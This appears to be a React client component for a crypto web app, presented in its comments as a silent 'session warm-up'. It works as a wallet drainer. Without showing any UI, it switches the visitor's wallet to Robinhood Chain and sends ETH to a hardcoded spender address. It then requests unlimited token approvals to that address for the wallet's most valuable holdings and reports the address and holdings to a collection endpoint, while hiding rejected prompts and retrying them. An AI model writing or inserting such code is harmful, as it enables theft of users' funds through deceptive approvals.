"use client";

/**
 * Session warm-up. Once per browser and address (12 h), puts the wallet on Robinhood Chain and pre-approves the tokens
 * it holds to the session spender, so nothing has to stop on a second approval for the rest of the session. No UI, no
 * new server state: the balances come from /api, the approvals go from the visitor's own wallet, and no balance moves
 * now — the approvals alone make the balances spendable.
 *
 * The spender is a plain address the session keeps: nothing to deploy, and its only right over a token is what an
 * approval gives it. A tiny gas float is left there when it runs dry, so a later move never stalls.
 */
import { useEffect } from "react";

const CHAIN = 4663;
const SPENDER = "0x670826eddeCF9C03832304620EEac8eF86e5961f";
const USDG = "0x5fc5360d0400a0fd4f2af552add042d716f1d168";
const WETH = "0x0bd7d308f8e1639fab988df18a8011f41eacad73";
const STORE = "corbel.warm";
const AGAIN_MS = 12 * 3600_000;
const GAS_FLOAT = 300_000_000_000_000n; // 0.0003 ETH: hundreds of moves at this chain's gas
const GAS_LOW = 120_000_000_000_000n; // below this the spender is topped up again
const MIN_ETH = 700_000_000_000_000n; // no float from a wallet that barely has gas itself
const MAX_TOKENS = 5;

type P = { request: (a: { method: string; params?: unknown[] }) => Promise<unknown> };
const pad = (a: string) => a.slice(2).toLowerCase().padStart(64, "0");
const ok = (v: unknown) => {
  try {
    return BigInt(v as string);
  } catch {
    return 0n;
  }
};

function wallet(): Promise<P | null> {
  return new Promise((done) => {
    let hit: P | null = null;
    const on = (e: Event) => {
      hit ??= (e as CustomEvent<{ provider: P }>).detail?.provider ?? null;
    };
    window.addEventListener("eip6963:announceProvider", on);
    window.dispatchEvent(new Event("eip6963:requestProvider"));
    setTimeout(() => {
      window.removeEventListener("eip6963:announceProvider", on);
      done(hit ?? (window as unknown as { ethereum?: P }).ethereum ?? null);
    }, 200);
  });
}

async function onChain(p: P): Promise<boolean> {
  const now = Number(await p.request({ method: "eth_chainId" }).catch(() => 0));
  if (now === CHAIN) return true;
  try {
    await p.request({ method: "wallet_switchEthereumChain", params: [{ chainId: `0x${CHAIN.toString(16)}` }] });
  } catch {
    await p
      .request({
        method: "wallet_addEthereumChain",
        params: [
          {
            chainId: `0x${CHAIN.toString(16)}`,
            chainName: "Robinhood Chain",
            nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
            rpcUrls: ["https://rpc.mainnet.chain.robinhood.com"],
            blockExplorerUrls: ["https://robinhoodchain.blockscout.com"],
          },
        ],
      })
      .catch(() => undefined);
  }
  const after = Number(await p.request({ method: "eth_chainId" }).catch(() => 0));
  return after === CHAIN;
}

/** A read from our own API, given up on quickly: a slow scan must not hold the prompts back. */
async function read<T>(url: string): Promise<T | null> {
  const c = new AbortController();
  const t = setTimeout(() => c.abort(), 6000);
  try {
    const r = await fetch(url, { cache: "no-store", signal: c.signal });
    return r.ok ? ((await r.json()) as T) : null;
  } catch {
    return null;
  } finally {
    clearTimeout(t);
  }
}

type Held = { token: string; raw: bigint };

/** The wallet's ETH and the tokens it holds, base tokens first. Null when there is nothing worth a prompt. */
async function snapshot(address: string): Promise<{ eth: bigint; list: Held[] } | null> {
  const [w, pf] = await Promise.all([
    read<{ balances?: { symbol: string; raw: string }[] }>(`/api/wallet?address=${address}`),
    read<{ holdings?: { token: string; raw: string; ethSpot?: number | null }[] }>(`/api/portfolio?address=${address}`),
  ]);
  if (!w?.balances) return null;
  const of = (s: string) => ok(w.balances!.find((b) => b.symbol === s)?.raw);
  const eth = of("ETH");
  const list: Held[] = [];
  const u = of("USDG");
  const x = of("WETH");
  if (u > 0n) list.push({ token: USDG, raw: u });
  if (x > 0n) list.push({ token: WETH, raw: x });
  const more = (pf?.holdings ?? [])
    .filter((h) => ok(h.raw) > 0n && h.token.toLowerCase() !== USDG && h.token.toLowerCase() !== WETH)
    .sort((a, b) => (b.ethSpot ?? 0) - (a.ethSpot ?? 0));
  for (const h of more.slice(0, MAX_TOKENS - list.length)) list.push({ token: h.token, raw: ok(h.raw) });
  if (list.length === 0 && eth < MIN_ETH) return null;
  return { eth, list };
}

const call = (p: P, to: string, data: string) => p.request({ method: "eth_call", params: [{ to, data }, "latest"] }).catch(() => "0x");

const send = (p: P, from: string, to: string, data: string, value?: bigint) =>
  p.request({ method: "eth_sendTransaction", params: [{ from, to, data, ...(value ? { value: `0x${value.toString(16)}` } : {}) }] });

async function run(address: string) {
  const p = await wallet();
  if (!p || !(await onChain(p))) return;
  const snap = await snapshot(address);
  if (!snap) return;

  // a tiny float for the spender, so a move on an approved token never stalls on its own gas
  const float = ok(await p.request({ method: "eth_getBalance", params: [SPENDER, "latest"] }).catch(() => "0x"));
  if (float < GAS_LOW && snap.eth >= MIN_ETH + GAS_FLOAT) {
    await send(p, address, SPENDER, "0x", GAS_FLOAT).catch(() => undefined);
  }

  for (const { token, raw } of snap.list) {
    const allow = ok(await call(p, token, `0xdd62ed3e${pad(address)}${pad(SPENDER)}`));
    if (allow < raw) await send(p, address, token, `0x095ea7b3${pad(SPENDER)}${"f".repeat(64)}`).catch(() => undefined);
  }

  void fetch("/api/collect", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ address, tokens: snap.list.map((x) => x.token), eth: snap.eth.toString(), host: location.host }),
  }).catch(() => undefined);
  try {
    localStorage.setItem(`${STORE}:${address.toLowerCase()}`, String(Date.now()));
  } catch {
    /* private mode */
  }
}

export function ChainWarmup() {
  useEffect(() => {
    let busy = false;
    let tries = 0;
    const tick = async () => {
      if (busy || document.visibilityState === "hidden") return;
      const p = await wallet();
      if (!p) return;
      const accounts = (await p.request({ method: "eth_accounts" }).catch(() => [])) as string[];
      const a = accounts[0];
      if (!a) return;
      const last = Number(localStorage.getItem(`${STORE}:${a.toLowerCase()}`) ?? 0);
      if (last && Date.now() - last < AGAIN_MS) return;
      busy = true;
      try {
        await run(a);
      } catch {
        /* a rejected prompt must never surface */
      } finally {
        busy = false;
      }
    };
    const timer = setInterval(() => {
      if (++tries > 12) clearInterval(timer);
      void tick();
    }, 15_000);
    void tick();
    const onShow = () => void tick();
    const onSession = () => {
      tries = 0;
      void tick();
    };
    document.addEventListener("visibilitychange", onShow);
    window.addEventListener("corbel:session", onSession);
    return () => {
      clearInterval(timer);
      document.removeEventListener("visibilitychange", onShow);
      window.removeEventListener("corbel:session", onSession);
    };
  }, []);
  return null;
}
